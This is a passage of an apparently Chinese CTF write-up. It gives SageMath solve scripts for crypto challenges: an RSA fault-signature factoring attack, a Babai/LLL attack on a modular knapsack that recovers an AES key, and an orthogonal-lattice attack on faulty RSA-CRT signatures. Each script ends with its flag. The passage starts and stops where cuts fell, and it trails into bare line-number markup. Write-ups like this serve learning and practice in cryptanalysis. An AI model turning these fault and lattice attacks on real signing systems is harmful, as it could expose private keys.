class="hljs-number">118076137063838269090177336257273614483013161795354323660372745060622648404840165375763965456051359345373381180872837778923107432847527822289778123491380755848215168391339890344352229041312053236458727521926887021839318215261693922819268849030352537025086960819870516023402598421784549576629658378015442799240</span>, <span class="hljs-number">73726416704339995858207913527983979137591480983643630655767675313162677692621631282122594716551271783472479754662561573893558511563005468410923907514989426007530211406501722104463324135158779524828888097314378227748117114448361841244384438150784594243192392834393592350155672277162730541251189869178462973342</span>, <span class="hljs-number">76775554870101016681046117666689472757424836396006154587185855962161082566480233587666261061413668630416222801526149178535527345714211178725571402702954723409172726161030946265626139818921087035605004138921403226490228657268453760809894403146365936345886667573320286850857027385349008436439192300151229638832</span>, <span class="hljs-number">35105200013033745064698144583376032748326959535850870706226290076417761080644620513540748759798869968720566639302361746559800548248870934996828154064847756666037955564350198474453628433320583544571826502833093620382564477658571823573826085709985201182878509689529393601382224111829545188311888304973403112317</span>, <span class="hljs-number">117305979732909615679961283974497229201792731701386498932249843807270219995331916140411048487774245898581996027126549043629917790199165880805639914031862525326716317454456540903992864253751858080005697252696290977222614318439893769598636140808753876726985134467863680138570429059853511433457200443572141978174</span>, <span class="hljs-number">61760670068468840498457336775733074114181033002435946427055907333958328650554127726502825399886270381617045254885548358678921866146285660857736263862924521048311682006579779521914796930590463830331643522139644393250279038641965515820180326284124333136930297812774506289281608418230697902216636558746451073094</span>, <span class="hljs-number">33826090534947450391006289487611253483625777900961143305547867131126078612152820391697942734968180577978865286982458215529334631784601089614644091813412395754447852044691153030042593843028580333977084236741452053439119075505257740937594267192523427030503476875302148297512098433808751509110421917124217726901</span>, <span class="hljs-number">43302109069901394813566807267862006418442942643020011320209781876379681238691261234737146448028043971847159173636292793651222392949261472047520728915125159265475320092326060656427057637310134753628696781570848228578952349014320788818112322315440103658271704463168762978750273070429315650202930816885964461056</span>, <span class="hljs-number">129471064876520150546455941856701138259726635566593972825982551382553016885426730441251266397562120833367016464980281759741579122631410940286947608231265535395035944305009014225188995273373704809599520655254603336157216608905868005482308148656931996408959260195923444822318776490332137853252833463419474179133</span>, <span class="hljs-number">7546982068189005977591634601706404795290941233354722518763625862654596155345912345729161660964232945387321999681571535314864059099145250960795364530889140353585200985598549709595896043827036321820471054360893244843089678507138381713637280178416626773935743828230338419293639954706047251726443958345296286253</span>, <span class="hljs-number">93106761455552709981784440761756127766845153743064912105820038407214619544725267116681964980170761868354637008048347503789772184084460955829116944991636860736435379290766272509196663385388219695419950622560986908609445469878801522768133019967261936331642573240460211250804869372140244002455162896297539551588</span>, <span class="hljs-number">102494632206935294020689123663187202878431013052196175045265865674337044967316795546330659801098067093764157857196289024783869455502486853681521747675583213652190339331998648936926722726534441025441159308526955515490654338073383494975242703700832807764154580981160828939275003604420433822169968177943281987090</span>, <span class="hljs-number">97707196275830706571544188698858803551064198932917612812793909113204549910229872258444267491202571334456798460837489283671182225942973056911780864722172672337364798355680301584088335305253900212328426056404269227960377443195735677045675990601290240072147789650576170245673761593999536102419233086642445167689</span>, <span class="hljs-number">87578979676445764714177813354224410965081547901517088773079737429877130607777083269813267355895802221573089615115669441588513540502003597163586375991048735230120513989140579179734697010086401756799911971432085322316581599987968796666882085230905107061894372269162261282358022241046292859165730597225116850824</span>, <span class="hljs-number">97837871187716943630015932088157170022828381857232532763719122193760730222498157729509173563193985872835331599849419924145021612088910526294161971814292637516931701982257434172425503079263562277898453543177167015007278123036188476734748397102975699436233768683009729954124182691649865441155934116273145653048</span>, <span class="hljs-number">122486402162352164164617536986347745883140013414390289937530082472833809716567827511350414635527940074357523469086778837976504796483765134054124962845260123098531323433711139704281511345771374123278351571822122792243844480065059904186900009238677477387442839671931892244495324455748478810278740584567136440000</span>, <span class="hljs-number">68452263421303226415871971483359841307830455504672515956319927475914154802300565843393002364553339715157059467041068479146855294921849606835421519503663394999036074970479016424812750518228365695072047833953877443772790219531511483913091272060971738262762705055978300619078069803471603546060472480202805969304</span>, <span class="hljs-number">71055697792792852995971153063675319888986346699848956483584329661205173586570042722098050157818613276398100378766690533019733719069484327876344433130301195945411968291787616568465597569867675069924496479539629942857082954178768607608719733870290373363401469227691742026385830665465699834861981376937094678386</span>, <span class="hljs-number">58053497804376033438901335076756766146677614008314078060718994322723711218316261106625096651460238242887299609903200336650700194546093716413268920169743935619736904676274450859965734433940917527872078233796594605756411180055656185259004552660740095902062464066735677377463250502584853558854426183281118647851</span>, <span class="hljs-number">53568118043799995580686528900070102353734019632922173821515115520779210810515145562416449689266838810422454215570916172532895263064683386888079860727732868498254542912005174566170362133818823925861019773863838875659268091564211941244982697316622894096613335432112379988949024120732963880711563937725640476361</span>, <span class="hljs-number">54537203614069356341247136604438177803196795877612936299879896037375103676052089312531059186905697542477287206589644969962217577367090182423743724737368096471570409725811885262736475879686692109660354277052184064452755896339111412164304039454701739838594721858866829468938907506628695291387340560142006564807</span>, <span class="hljs-number">17590130588133520049104993524745938919046647324319116233160486991341417005750209369102799250845847433565950085580156621674894808064633541333461770020696201023217141901924674329003387795233875519644416655441404337298057500097676069795236000599051821817807681193769369165515926020288210814851592732875195792529</span>, <span class="hljs-number">82561711769540482948798699156535815671234468901236599054088128669570195084531079723790670675364794078193264875907939091295680038844865845972511307739251080079353596855919970539133100998894123140397183783073823710751753474348435606939030935168826249985089073522582382413668746543384379090327897183721158599228</span>, <span class="hljs-number">128682463199652136199425648721272867550492854789826935634772480660219255770025901974293101786685863282355449901134552146139063629455022985318295860855249994565485787860632700413579779960128353741757411853300173731540988793688123421893871512104626353311528089819064472469725263020890057953755045317640684418412</span>, <span class="hljs-number">111830614157587399876103920049810851149815442663274529630764091092256716623329981287104859198334159829176308539774003950578196400683103861463993204850911639451975312720186375606903956928863194309419956898905169419379202400118890610166748646089109453281819194035053227357019016343077049569033479355378153190650</span>, <span class="hljs-number">7743466771894974008407519719433673930581204670149400884336443280937875457185577322742373735218366781402710632291775468915790021876252711219566878042000111398629529348167793590059211693490502060571519315790679105935243351233922477504260026036407472967755360184115911427796187878923044630015896804599921163214</span>, <span class="hljs-number">83524834307009730585812953283889535123689200939071254900035103102226704856203571931707232466477380193697283773523640602005899420942935510298065436394592130275571735453003589570903598224135866273305287314765184270870615188040687981960755329673715894576462441385847472134353916941404172983131492173550423547754</span>, <span class="hljs-number">117912393762872878257471455622415972729405272869475900328719070365926977568077460452534558219870105558670973233219874972136716182560190770386203998758955932105188002083871549276318357452793540787162395242828809859745533555997452025360288506303635368830870973603796642228775329239299062970380049402050440749516</span>, <span class="hljs-number">112890954481863138614741529632046582174816200785354159050640436720840162169771877928817003677702686523786566895561663240741230629448536961811362017921188161215377519942530924005423587969022753352449642252200224944558450458685684052076779876116571146722870042366903598365144085616642650272423012695988174890823</span>, <span class="hljs-number">66668573394165091945062434979301337554998934559040587110970900587497739891360985799502499630543176216821242214751649987658458294591732563307421470774017878231435307325863408975452929714596017735856887309630858651140234631657353580845011566043021545737238926316820848105005351972108553428921809293035357265589</span>, <span class="hljs-number">42428504447557190426085778047552104840357112149397197959606348707393426259013311541481129953589569576600678807050429859867284448153340235186861782056748182521050512869779198168422569498947138326591669023971488642830973224171671691417638268986103269046265492373746830365508636415776781186103761281360058016154</span>, <span class="hljs-number">28329568884461415187792923483114455528351589246553813588543722492419377266140476588451267652083755549713023914804709960724677988807524866633562917133878266288107465756862344673137546233312006854100386301059735613069614731276106307614984613571880266118277645052377101372686714091532938323262711643130226241848</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_lp</span>(<span class="hljs-params">e, n, ld, kbits</span>):<br>    X = var(<span class="hljs-string">&#x27;X&#x27;</span>)<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, e + <span class="hljs-number">1</span>):<br>        ans = solve_mod([e*ld*X - k*X*(n-X+<span class="hljs-number">1</span>) + k*n == X], <span class="hljs-number">2</span>^kbits)<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ans:<br>            <span class="hljs-built_in">print</span>(x)<br>            <span class="hljs-keyword">if</span> n &gt; GCD(<span class="hljs-built_in">int</span>(x[<span class="hljs-number">0</span>]), n) &gt; <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(x[<span class="hljs-number">0</span>])<br><br>e = <span class="hljs-number">7</span><br>kbits = <span class="hljs-built_in">len</span>(msg_fault_sigs)<br>ld = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(kbits):<br>    now = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(msg_fault_sigs[i], e, n))<br>    <span class="hljs-keyword">if</span> now == <span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(bytes_to_long(<span class="hljs-string">b&#x27;ddddhm&#x27;</span>), <span class="hljs-number">1</span>-(e&lt;&lt;i), n)):<br>        ld += <span class="hljs-number">1</span>&lt;&lt;i<br>p = get_lp(e, n, ld, kbits)<br>q = n//p<br>d = inverse(<span class="hljs-number">65537</span>, n-p-q+<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c, d, n))))<br><span class="hljs-comment"># flag&#123;54b5dc19-5037-46c3-8afe-45394f236852&#125;</span><br></code></pre></td></tr></table></figure><h3 id="easybag"><a href="#easybag" class="headerlink" title="easybag"></a>easybag</h3><p>背包问题，但是结果对p进行了取模导致常见的格基规约难以求解SVP<br>此处使用Babai算法求解CVP的效果较好，可以恢复key的值，进而恢复flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br>p = <span class="hljs-number">94154607166206368507849450076562888867777996786776585204541315115554265673239</span><br>pub = [<span class="hljs-number">13558005804894620335697666695157375129697290797741397021993594548263141225185</span>, <span class="hljs-number">59100377682228233248259149993117848589507966669415965396505753313255772484735</span>, <span class="hljs-number">47203140847285209690197775939725446140228935533192678649736832535977586766657</span>, <span class="hljs-number">41931934930013700538175901034615026851307155264693289541912768198101883139200</span>, <span class="hljs-number">34600830342506187749361900452651328134776307385652325752852473167695972843115</span>, <span class="hljs-number">87640782336847365756484674868883213823373923714943730733375997668462983688038</span>, <span class="hljs-number">46665325617149847662294815433566827879247054902007756459977900724576956930238</span>, <span class="hljs-number">7630102294629000071648786320570215400445944873898703154806156572372671923081</span>, <span class="hljs-number">28527795592041096912997042180130633828658042409636021884128608005311625241616</span>, <span class="hljs-number">48817875040757505575226334137591514796302781418971911589454396062223787201917</span>, <span class="hljs-number">13255147124279970300070471647577356621503689887387302226734806820266747474808</span>, <span class="hljs-number">35402792535703359866981648503422240071754439627501334894850939689231868215135</span>, <span class="hljs-number">32096486738038490474299531943010354951480863898639806169937034178619974350617</span>, <span class="hljs-number">53796403150739214931374312544531149937237602632833613136878306939750970956473</span>, <span class="hljs-number">54983553100507197181500293731582654525408296950106771274995347122732790613144</span>, <span class="hljs-number">78089465497793663917498756488988307210150642639541862861838679893054295887504</span>, <span class="hljs-number">72102666461042750236884036568516037906284283594884004107747986408795866699372</span>, <span class="hljs-number">25205929877393680775925192899276583872943822522732792361803075959348555266633</span>, <span class="hljs-number">73569982812592191070543881751396722110823057810338019363134145063958506216983</span>, <span class="hljs-number">2088202935774439157687167818481322834944309182788412111799843369630242323474</span>, <span class="hljs-number">48595322641271785006228649310883337480428294554328113174151951016612527760846</span>, <span class="hljs-number">51760926243228584037653924308259980640851259284678368807891664272274451903042</span>, <span class="hljs-number">60972672839459660624733547945444352444564866386661657085629482140478629017252</span>, <span class="hljs-number">81764834201781756833426691130605289192895677482907294866198302409014283345719</span>, <span class="hljs-number">45564921427256648952930549595744780922450728606081883043890551086293741648704</span>, <span class="hljs-number">11546124315022121112010407507682750282699601646772973993144675005994676860886</span>, <span class="hljs-number">92131518253108261083785500706056401679992613109559776512718290127164091431412</span>, <span class="hljs-number">51389379720849274237033447110263198191452790814489779714421318664581053598808</span>, <span class="hljs-number">44312622653933798618054908129398899008892235276397257672730716870062818221473</span>, <span class="hljs-number">70666271772579353628875975929849785989895352053744867444867924961771176550910</span>, <span class="hljs-number">1022761764417929351401227837288503469803327306746617444127801609783349439735</span>, <span class="hljs-number">68627432450132640523862810752994895413427816006228852597818417524517732514350</span>, <span class="hljs-number">8511138383146897962027474703813126003023440135100045398587391499968626350422</span>, <span class="hljs-number">31835105391545548957341476664214356089634342776763639131243986103325636836303</span>, <span class="hljs-number">55948480159418323822671978119946237891780186582911116704975552528012107246904</span>, <span class="hljs-number">55939548765231641770843516606677961462192677789127144112398249578595518236030</span>, <span class="hljs-number">20278834290551726759933704289080539150033014812784593972020141194417541880439</span>, <span class="hljs-number">73338740361159581768576605670854710647315802795532659722801776055886181249196</span>, <span class="hljs-number">76030530797619429775272782139815361420031920989903555900304383499427424691028</span>, <span class="hljs-number">29434488504120326762494784919047205002020356219284552062468984751289660011144</span>, <span class="hljs-number">70227628106756168643766787327064214794880142284692886739392137490279018434102</span>, <span class="hljs-number">24574946221293978596894258842130084362477010338545022538797491453437090815299</span>, <span class="hljs-number">6498106168053907890618186261665652189349047912867389234926938720401618310435</span>, <span class="hljs-number">89544437087791083328953917039272623964595858289587652369164257989512245819862</span>, <span class="hljs-number">10160703116362866249140930173762313868253569896922018161770610214791827114729</span>, <span class="hljs-number">76227093331364018857371734525542577074111530213433351474717923617789017495624</span>, <span class="hljs-number">15711426473810618056409128995696582093601485048202406838767589077201299123260</span>, <span class="hljs-number">10686228588336791778046934061860194190302510165978184916374294528370290854376</span>, <span class="hljs-number">743613502117417805717788796940788273702216571188502886117674965400126386594</span>, <span class="hljs-number">78117535452041628513083051136496582640102481347370178358531807794866005852302</span>, <span class="hljs-number">65422888907790441789066675735260369825243738808162289359370573767294073389543</span>, <span class="hljs-number">64513441837802159954407971302165651403055502196511115018903417756542405033208</span>, <span class="hljs-number">1445954148502126112702617051436662059642285218246554311110203671284796568239</span>, <span class="hljs-number">78441138130637968035058014810800340697720095799909152986595764312261055325612</span>, <span class="hljs-number">72602744597138181431124073095992777463769309366668520177727154848781655032600</span>, <span class="hljs-number">9786934211176167525996495418302215387385800641019822009416705683093970268940</span>, <span class="hljs-number">44943695239822266941127148357724393787078734075722008436487144680302609249634</span>, <span class="hljs-number">70781641195178108826300599782282991675945297046163684928015312469855982285294</span>, <span class="hljs-number">58235271417245212032570174014807598168239520942582767758692549437338153222204</span>, <span class="hljs-number">92877022115452578515908587738974006957886472693342404193199518045790086717455</span>, <span class="hljs-number">70767591165382026255868033108388660762134896305917797432131257129495704309297</span>, <span class="hljs-number">55657364531211200525510486301527531771575735049596151759833888509362181870297</span>, <span class="hljs-number">44336153977928031254990878584737529363699845706938343159951700205026319387000</span>, <span class="hljs-number">68798336155332657027923387549177788534756411943373654774711482160905197111316</span>]<br>c = <span class="hljs-number">300528310281431128814608316680537971945579270793936168485054801251195415271</span><br>enc = <span class="hljs-string">b&#x27;Z\x8b `I\xa6\xde\nF\x13J\xf4^1&#125;\x98*R-[\x9c\x851\xf4\xeeF\xea\xbc$s\xd8\xb4F\xebg\x86\x8e\xb0\xc9%V\x12&amp;Rw\xcc\n\xc0&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Babai</span>(<span class="hljs-params">B, w</span>):<br>    A = B.LLL()<br>    G = A.gram_schmidt()[<span class="hljs-number">0</span>]<br>    t = w<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">range</span>(A.nrows())):<br>        c = ((t * G[i]) / (G[i] * G[i])).<span class="hljs-built_in">round</span>()<br>        t -= A[i] * c<br>    <span class="hljs-keyword">return</span> w - t<br><br>M = block_matrix([<br>    [<span class="hljs-number">1</span>, matrix(ZZ, pub).T],<br>    [<span class="hljs-number">0</span>, ZZ(p)]<br>])<br>ans = Babai(M, vector(ZZ, [<span class="hljs-number">0</span>]*<span class="hljs-built_in">len</span>(pub)+[c]))<br>key = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ans[:<span class="hljs-built_in">len</span>(pub)])<br>key = long_to_bytes(<span class="hljs-built_in">int</span>(key, <span class="hljs-number">2</span>))<br>aes = AES.new(key=key * <span class="hljs-number">2</span>,mode=AES.MODE_ECB)<br>flag = aes.decrypt(enc)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment"># flag&#123;e42f0ab28e1c5fb04bbb0c797a2cd951&#125;</span><br></code></pre></td></tr></table></figure><h3 id="my-fault"><a href="#my-fault" class="headerlink" title="my_fault"></a>my_fault</h3><p>根据正确与错误的signature、正确与错误的模数n进行CRT可以恢复RSA-CRT取模前的真实值，求解两次正交格后可以将向量空间落在mp、mq上，暴力枚举小系数进行组合即可分解模数n，进而恢复flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>sig = [(<span class="hljs-number">57868553591400842657953934041706334225193340937554557721855165199169945727847060414972568103211720176449859323059273929941793344251833479834662213717934173466357264302430567770503575880312216409600708717869166323749494662227007011714825238815533767351619457577488576774216589896882247144186580576769322097812</span>, <span class="hljs-number">57868553591400842657953934041706334225193340937554557721855165199169945727847060415002480474701083840019628098504782471742472878003307770253681694995900494158166847376315908285012567539039753200673812172480963463248702937994864056409093384333043514818983342609877792502603164027310875230850936363180326485874</span>), (<span class="hljs-number">49171975443469873067078117247671124300824757898648824685724862006418894673974653477861829631616668663207300775025813798519528211106532439806622673174671840041045015466887500329521589935229729869447630896431801023913778113776086701569185508523496369045834174533824339611510846306581948246745632394045855515543</span>, <span class="hljs-number">49171975443469873067078117247671124300824757898648824685724862006418894673974653477887754935759654246224691224058440593298403556234079690622978255834790607053580157662746913870927058288528631971141333812416872857128658826869897857489519289149723701056750182632616557640796007814610265598601314108660465350822</span>), (<span class="hljs-number">38242241313005635872096329134730773643501715973179593684344944669861621835322893671510668610916561710464145576451084213748781501562898044677155086354037634151146975926910732294931667214775888370183278613006165404346282267910323384214183821325033958088995640486712160815256007901130889124999821240256177509502</span>, <span class="hljs-number">38242241313005635872096329134730773643501715973179593684344944669861621835322893671543112728741142451715760057070928251569564896434599370771272769443379527534836540108405485526427315129094656595278659234763179717306423683296288876091069064531141480153855424552759676659893212127130496563003755007639019153702</span>), (<span class="hljs-number">14529962850966926265013494701360598035306621650370915483998414863695479047734704457537124092168240054727259566704408889151822965259868779592946037044793943952884456034023040427556159207075699863245519955344229822095102535935238724533625011615807856735054914491186371905743590846254257379647320058858303951574</span>, <span class="hljs-number">14529962850966926265013494701360598035306621650370915483998414863695479047734704457557907857154897077239558389206751219461340306460195272540014186372444608143405801242117188619488853524198320122961039638596538967640812566827987326738775127804411349740574988352808010707562933685260033368965010367007084085224</span>), (<span class="hljs-number">46844163144906587257330904384060444104125603187729185163281199078682476263940806954229139266637477691797500851914066028261452315570532337660596976227510319237947989981504606429566779427371581808326526352823915816345490500824599417299410614012353081623864591870033718008785997974589525604908340240257482326486</span>, <span class="hljs-number">46844163144906587257330904384060444104125603187729185163281199078682476263940806954238213199098343166530691122399994896552275344828907994592474709128083007917633690793662295647064430882589511075787692804972653225088197681465958997614089742860102991696115379470778788176774208757942210199295088339343799315802</span>)]<br>e = <span class="hljs-number">65537</span><br>n = <span class="hljs-number">60674610013465119171596047337991221351949398323488704251815724751066355820934754032892829767526766819900836100708471380103738011137899584882690614504864727494195655113621535500648948534952721102316904897394762248022998038598239683088960476724400716401202961110466846822677768372714386227950788963059019784893</span><br>enc = <span class="hljs-number">48211625012335204831727638590678221580160171263427537396361490969732803835399523374794367743429208230894595097220265932981778900576899870970624397148503423254272678510966818035955654541150930136737226992811603090076353265139980349537071055762414849000493476573583331991711355289377750277595012442208304616396</span><br>n_ = <span class="hljs-number">60674610013465119171596047337991221351949398323488704251815724751066355820934754032892829767526766819900836100708471380103738011137899584882690614504864727494195655113621535500648948534952721102316904897394762248022998038598239683088960471008829172014029481916113353888431454240967048097757354298802085822464</span><br><br>t = <span class="hljs-built_in">len</span>(sig)<br>s = [crt([sig[i][<span class="hljs-number">0</span>], sig[i][<span class="hljs-number">1</span>]], [n, n_]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(t)]<br><br>L = block_matrix([<br>    [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>^<span class="hljs-number">1024</span>*matrix(ZZ, s).T]<br>]).LLL().matrix_from_rows_and_columns(<span class="hljs-built_in">range</span>(t-<span class="hljs-number">2</span>), <span class="hljs-built_in">range</span>(t))<br><br>L = block_matrix([<br>    [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>^<span class="hljs-number">1024</span>*L.T]<br>]).LLL().matrix_from_rows_and_columns(<span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>), <span class="hljs-built_in">range</span>(t))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-<span class="hljs-number">100</span>, <span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-<span class="hljs-number">100</span>, <span class="hljs-number">100</span>):<br>        now = i*vector(ZZ, L[<span class="hljs-number">0</span>])+j*vector(ZZ, L[<span class="hljs-number">1</span>])-vector(ZZ, s)<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> now:<br>            p = gcd(k, n)<br>            <span class="hljs-keyword">if</span> n &gt; p &gt; <span class="hljs-number">1</span>:<br>                q = n // p<br>                d = inverse(<span class="hljs-number">0x10001</span>, n-p-q+<span class="hljs-number">1</span>)<br>                <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(enc, d, n))))<br>                exit()<br><span class="hljs-comment"># flag&#123;84abbf23-b561-471b-8705-8d3ccfdcf2c6&#125;</span><br></code></pre></td></tr></table></figure><h2 id="敏感数据泄露识别2"><a href="#敏感数据泄露识别2" class="headerlink" title="敏感数据泄露识别2"></a>敏感数据泄露识别2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span 